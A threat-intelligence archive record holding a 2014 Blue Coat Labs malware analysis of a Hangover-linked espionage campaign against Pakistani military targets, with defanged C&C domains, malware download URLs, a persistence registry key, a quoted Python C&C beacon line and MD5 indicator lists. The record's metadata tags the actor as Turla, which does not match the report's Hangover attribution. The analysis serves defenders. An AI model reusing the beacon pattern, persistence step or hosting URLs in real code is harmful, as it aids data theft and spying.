{
    "id": "bcc16957-a66f-4e72-835a-0ad2c45a3a30",
    "created_at": "2022-11-23T12:04:51.925384Z",
    "updated_at": "2025-03-27T02:06:01.071548Z",
    "deleted_at": null,
    "sha1_hash": "404684de15d532cfce5a6f7523c461134d362319",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-12-30T18:07:10Z",
    "file_modification_date": "2016-12-30T18:07:10Z",
    "file_size": 908446,
    "plain_text": "### BLUE COAT LABS\n\n\n## Labs Blog\n\n\n##### Share this: \n\n\n#### Snake In The Grass: Python-based Malware Used For Targeted Attacks\nSnorre Fagerland, Jonathan Camp, Morten Kråkvik\n\n\nJune 10, 2014\n\n\n**Researchers at Blue Coat Systems have identified an intelligence-gathering campaign**\n**related to the Hangover operation detailed in 2013. The targets of this operation**\n**appear to be Pakistani and presumably represent military interests.**\n\nThe malware used for this is very simple, but uses a little used format. Instead of the\nprogramming languages most commonly used for malware creation, the actors have turned\nto using Python, a powerful scripting language. The scripts were found embedded inside\nregular executable files designed to run Python scripts without having to install the full\nPython package.\n\nThe inclusion of malicious scripting code in relatively mainstream installers is probably\ndone to avoid antivirus detections, and regular AV detection rates on these executables tend\nto be quite low. However, BlueCoat Malware Analysis Appliance proactively detects these\nmalwares with a high risk score.\nSeveral indicators point towards the same attackers as were detailed in the Norman Shark\n(now part of Blue Coat Systems) Hangover report from last year. This campaign is not the\nfirst sign of life from these actors after we published our report – there have been several\nsmaller initiatives during the autumn of 2013.\n\n\n-----\n\n# Initial malware\n\n\nThe initial installers of this campaign were discovered due to behavior similarities with\nprevious Hangover-related malware. These appear to have been prepared for email\ndistribution or possibly for web download. Four such installers were identified; files with\nthe MD5 hash of:\n\n0392fb51816dd9583f9cb206a2cf02d9, (original name Brief DG Arty-8 30 Aug.scr)\ne6d9fce2c6e766b0899ac2e1691b8097, (original name Debriefing Indian Missile Def\n**_Prg.scr)_**\ne013691e702778fa6dbc35b15555c3c2, (original name HQ Div Sp Eqs 21 Dec 2013\n**_final.scr)_**\n9d299d3a074f2809985e0317b9c461eb, (original name HQ 19 div CTGY PLAN-Offn\n**_Objs.scr)_**\n\nThese are all self-extracting archives (WinRAR SFX RAR and SFX ZIP), which again\ncontain lure documents and a malicious Python installer.\n\n\n0392fb51816dd9583f9cb206a2cf02d9:\n\n\nThese files are all created using the PyInstaller tool. The “archive-viewer.py” Python script\nprovided with the PyInstaller package can be used to examine these installers:\n\nMost of the objects in these packages are legitimate libraries and components required by\nthe installer itself. The highlighted “send” object is where the malicious Python script\nresides.\nAnd, as Python is a human-readable format, this makes analysis straightforward:\n\n\n-----\n\n_Python function made for testing connection to Command & Control servers. Note how_\n_worldvoicetrip[.]com can supply a new C&C server (“code4”) in domain.html._\n\n\nThere are two main functionalities for these scripts:\n\n\n\n - Harvest system information using existing system tools like systeminfo.exe. This\ninformation is attempted uploaded to Command & Control (C&C) server.\n\n - Download and execute more malicious executables.\n\n# Decoy documents\n\nThe documents accompanying the malware executables seem all related to Indian military\nmatters. The excerpt below is labeled confidential; however the text is taken from a\n[publicly available source at armscontrol.org. (https://www.armscontrol.org/act/2013_01-](https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances)\n02/Indian-Missile-Defense-Program-Advances)\n\nThis document contains references to Artillery Firing Data Computing Devices\n(AFDCD’s), which are given to be Casio FX-750 and Casio FX-880-P. However, these are\nmodels of handheld calculators from 30 years ago. They are not used for military purposes\ntoday.\nAt least, I hope not.\n\n\n# Case expansion\n\n\nCase expansion is the process of mapping out connections with other cases and malwares to\nunderstand the larger threat picture. This gives information about\n\n\n-----\n\n - what activities are ongoing\n\n - against whom\n\n - using what tools\n\n - and how to mitigate\n\nThis process involves multiple iterations of pivoting by a great deal of possible parameters\n– similarities in malware, similarities in network traffic, various domain registration and\nhosting information, passive DNS data etc.\n\n\nWe begin with the beginning – what we can learn from the initial malware files.\n\n\n**Command & Control – hosted malware**\n\n\nAs shown previously, the C&C servers used in these malwares were:\n\n_games-playbox[.]com_\n_worldvoicetrip[.]com_\n\nThe latter server was down by the time we noticed the malware, but games-playbox[.]com\nstill resolved to the IP 176.56.238.177, belonging to AS198203 ASN-ROUTELABEL\nRouteLabel V.O.F. in the Netherlands. Internal and public databases show that this server\nhas been hosting malware for download:\n\nhxxp://games-playbox[.]com/testing1/download/reg.exe\nhxxp://176.56.238.177/testing2/download/reg.exe\nhxxp://176.56.238.177/testing2/download/reg1.exe\nhxxp://176.56.238.177/testing4/download/reg.exe\nhxxp://176.56.238.177/testing2/download/winrm.exe\nhxxp://176.56.238.177/testing2/download/sppsvc.exe\nhxxp://games-playbox[.]com/winone1/download/stisvc.exe\nhxxp://games-playbox[.]com/winone1/download/sppsvc.exe\n\nBrute force testing showed that at least subfolders winone2, winone3 and winone4\ncontained similar content as winone1.\n\n\n_reg.exe, reg1.exe:_\n\n\nThese are MINGW32 C++ (not Python) executables which have only one function – to\ninsert a registry key that allows other malware to be run on startup. For example, the\nexecutable reg.exe (05dc62dcd4ddc9f2a79c5d23647c25c2) creates the key:\n_HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Search=C:\\dir2\\CscService.exe_\n\n\n-----\n\nThis separation of functions is likely done to avoid detection logic that triggers on software\nthat inserts itself into such run keys.\n\n\n_winrm.exe, stisvc.exe:_\n\n\nThis executable is a data stealer, which enumerates folders and harvests files of format doc,\nxls, ppt, pps, inp, pdf, xlsx, docx, pptx.\n\n\n_sppsvc.exe:_\n\n\nThis is a keylogger, which hooks keyboard and mouse events.\n\n\nIn connection with these findings we found that the same Python functionality was\nsometimes embedded in executable files of a slightly different format – namely py2exe.\nThese files have a different internal structure than PyInstallers, but the embedded scripts\ncan be extracted and decoded using the Python module uncompyle2.\n\nPassive DNS analysis shows that games-playbox[.]com has shared IP address with other\nsuspicious domains:\n```\nRdata results for ANY/176.56.238.177  \ntechto-earth[.]com.    A   176.56.238.177\ngames-playbox[.]com.   A   176.56.238.177\ndownload-mgrwin[.]com.  A   176.56.238.177\n\n```\nIndeed, techto-earth[.]com shows up in Google with an entry on the URL checking service\nURLQuery[.]net.\n\nThis download link (hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe) was at the\npoint of writing live, and the downloaded executable (md5\nc571b77469ad3c5ef336860605ee85c6) was verified as a PyInstaller-based malware. Brute\nforce attempts showed that this folder also contained stisvc.exe (md5\nf2a1ca02bf4a63a3d4a6c6464f5a925b) and reg.exe; these have same functionality as the\nidentically named executables found on games-playbox[.]com. The techto-earth[.]com\ndomain now resolved to the IP address 81.4.125.90, similarly belonging to the Dutch\nprovider RouteLabel.\n\n\n-----\n\nThe domain download-mgrwin[.]com which shared the IP 81.4.125.90 with techto_earth[.]com was also found to host similar malware:_\n\nhxxp://download-mgrwin[.]com/southside/download1/stisvc.exe\nmd5 6ec82e9eccb9bee050c9f7f2750d0c7c\n\nhxxp://download-mgrwin[.]com/southside/download1/sppsvc.exe\nmd5 acfada8e91eda6cca2da66bbb032d924\n\nhxxp://download-mgrwin[.]com/eastside/download/sppsvc.exe\nmd5 6dc9eee24f8d5cba1ca3919b87507d86\n\n\n**“Nick Agroyes”**\n\n\nDomain registration information is useful for connecting cases. Though often falsified,\nreuse of the same registrant information is common, thus providing a way of linking\ndifferent domains.\n_download-mgrwin[.]com was registered on the email address info@communication-_\n_principals[.]com, purportedly belonging to one Nick Agroyes:_\n\nThis is a faked record, but the same address was used to register other domains of which\nsome have been documented used by malware - alertmymailsnotify[.]com, communicationprincipals[.]com, servicesprocessing[.]com and websourceing[.]com.\n\n_communication-principals[.]com: md5: 664f32f06dd7bd8c94df6edfcf6285da_\nThis is an exploited RTF file leveraging the CVE-2012-0158 RTF vulnerability which\ndownloads a file from hxxp://communication-principals[.]com/vargualm12/putty.exe\n\n_servicesprocessing[.]com:_\nVirusTotal shows a number of links to malicious executables on this domain.\n_hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe_\n_hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe_\n_hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe : md5_\neeaf96b1988c7016780c0d91ce2451c8\n_hxxp://servicesprocessing[.]com/panomasi/plugins/wsutils.exe : md5_\n4a9a912a8610495029ef3df813272d8a\n\n\n**Other registrants**\n\n\n-----\n\nThe file 4a9a912a8610495029ef3df813272d8a has also been hosted elsewhere, on\nalertmymail[.]com:\n_hxxp://alertmymail[.]com/lotopoto07/plugins/wsutils.exe_\n\nThis domain is registered on the registrant sakanika@rediffmail[.]com. Other domains\nowned by this entity are necessaries-documentation[.]com and accountsloginmailprocess[.]com which show pDNS overlap with the previously mentioned malicious\ndomains.\nPassive DNS investigation and malware hosting data shows additional overlaps with the\ndomains newsfairprocessing[.]com and manufacturing-minds[.]com. These domains were\nregistered to the registrant tomhanks542@gmail[.]com.\n\n\nMalware referenced in relation to these domains is for example:\n\n\nmd5: 6f9f2e57eb06c5385f7e9370a71aa34b. This is a MINGW C++ keylogger, hosted at:\n\n\n_hxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe_\n_hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe_\n\n\n**AutoIt**\n\n\nThough many of the malwares we have examined in this campaign were based on Python, a\nnumber of similar malware files were found to be based on a different scripting language –\nAutoIt. One such malware is known under the family name Emupry or AutoIt/Emupry.\n\nThe executable file “Quetta_Killings_Footage.exe” (md5\n387947d5891aeb2c32f231e9abadfcec) connects to the known malicious\ndomain communication-principals[.]com. When the AutoIt script is extracted we see that\nimportant variables are base64-encoded. For clarity, these have shown inline as comments\nbelow:\n\nVery similar AutoIt malware was found for the following C&C servers (domains in bold\nwere documented in the original Hangover report):\n\n\n**MD5                              C&C domain**\n\n```\n8c18852f79f14880ed9bd1d3be2fa48c  alertmymail[.]com\nddd6b9bef4d37b43484d1a0eab4753c6  alertmymail[.]com\n99f7cb87a4acbbd2aed2c4e860cd0f5a  necessaries-documentation[.]com\n04af2e8a7a1e934ab2000d701948a657  newsfairprocessing[.]com\n1f72e19999d56a11cd564d1f7b0652e7  onestop-shops[.]com\n2683e1d77b20e7aa75ade640ddb522d6  onestop-shops[.]com\n\n```\n\n-----\n\n```\n6d6fe7d36e1c43aab534644378d56dfb  westdelsys[.]com\n14a11b125f32a5a5773c23021ac4c1a1  manufacturing-minds[.]com\n84e2d98e4b3272b953b63d2021735fd3  cloudone-opsource[.]com\nfcccf9cb698297bb686561e7af7dad94  servicesprocessing[.]com\nf0ef59265610dedab40f8386af79f861  knight-quest[.]com\n\n```\n\n**HTTP request format**\n\n\nNote the form of the HTTP requests used by this AutoIt\nmalware: http://server/folder/online.php?sysname=.\n\nThe Python malware we mentioned first in this article constructed identical requests:\n_dfiles5 = urlopen(\"http://\"+ getserver + foldername+_\n_\"/online.php?sysname=\"+cname+\"\")_\n\nThis request form was used in a number of Hangover-related cases as well. Given the\nsimilarities in methodology and targeting we consider it highly likely that the current attack\nmalware and the Hangover infrastructures are related. It points towards the use of the same\nbackend infrastructure, designed to control different types of malware.\n\n\n-----\n\n-----\n\n-----\n\n_Above: Infrastructure map._\n\n\n# Conclusion\n\n\nThis is an operation of far smaller scope than the original Hangover infrastructure; but as\nmore capacity is rebuilt this might grow. We will keep an eye on what happens in this\nspace.\nIt is noteworthy that they have adopted the use of scripting langauages for this type of data\ntheft; scripts are easy to maintain even by novice programmers.\n\n\n**Indicators: Domains**\n\n```\naccountsloginmail-process[.]com\nalertmymail[.]com\nalertmymailsnotify[.]com\ncloudone-opsource[.]com\ncommunication-principals[.]com\ndevilcreator[.]com\ndownload-mgrwin[.]com\ngames-playbox[.]com\nknight-quest[.]com\nmanufacturing-minds[.]com\nnecessaries-documentation[.]com\nnewsfairprocessing[.]com\nonestop-shops[.]com\nservicesloginmail-process[.]com\nservicesprocessing[.]com\ntechto-earth[.]com\nwebsourceing[.]com\nwestdelsys[.]com\nworldvoicetrip[.]com\n\n```\n\n**Indicators: IP addresses**\n\n\n-----\n\n```\n176.56.238.177\n213.229.64.222\n37.59.175.131\n46.32.235.162\n81.4.125.90\n\n```\n**Indicators: Malware MD5**\n```\n04af2e8a7a1e934ab2000d701948a657  a24137ea1a87b89f24ecaa0b9cb5382a\n14a11b125f32a5a5773c23021ac4c1a1  dedb56941cfaf1a650e38ba2b43c8e2b\n1f72e19999d56a11cd564d1f7b0652e7  0392fb51816dd9583f9cb206a2cf02d9\n2683e1d77b20e7aa75ade640ddb522d6  6ec82e9eccb9bee050c9f7f2750d0c7c\n387947d5891aeb2c32f231e9abadfcec  9d299d3a074f2809985e0317b9c461eb\n6d6fe7d36e1c43aab534644378d56dfb  acfada8e91eda6cca2da66bbb032d924\n84e2d98e4b3272b953b63d2021735fd3  c571b77469ad3c5ef336860605ee85c6\n8c18852f79f14880ed9bd1d3be2fa48c  e013691e702778fa6dbc35b15555c3c2\n99f7cb87a4acbbd2aed2c4e860cd0f5a  e6d9fce2c6e766b0899ac2e1691b8097\na8bc0a09b5ee1e9ff40eac10ba0d43ed  f2a1ca02bf4a63a3d4a6c6464f5a925b\nddd6b9bef4d37b43484d1a0eab4753c6  0739e1aea8c2928b9d1b3bcd145e0bcb\nf0ef59265610dedab40f8386af79f861  4a9a912a8610495029ef3df813272d8a\nfcccf9cb698297bb686561e7af7dad94  eeaf96b1988c7016780c0d91ce2451c8\n05dc62dcd4ddc9f2a79c5d23647c25c2  f5d4664a607386c342fdd3358ea38962\n349583df5921e3d9fca9d4864072f6ca  f68eb7db21cd8abf5f60b16ca6c6a5e7\n6f9f2e57eb06c5385f7e9370a71aa34b  664f32f06dd7bd8c94df6edfcf6285da\n8dbadff3529ca03b8d453a7c9aaf3c6c  6dc9eee24f8d5cba1ca3919b87507d86\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/aptnotes/data/files/679036/Snake.In.The.Grass.-.Python-based.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf"
    ],
    "report_names": [
        "Snake.In.The.Grass.-.Python-based.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf"
    ],
    "threat_actors": [
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1669205091,
    "ts_updated_at": 1743041161,
    "ts_creation_date": 1483121230,
    "ts_modification_date": 1483121230,
    "files": {
        "pdf": "https://archive.orkl.eu/404684de15d532cfce5a6f7523c461134d362319.pdf",
        "text": "https://archive.orkl.eu/404684de15d532cfce5a6f7523c461134d362319.txt",
        "img": "https://archive.orkl.eu/404684de15d532cfce5a6f7523c461134d362319.jpg"
    }
}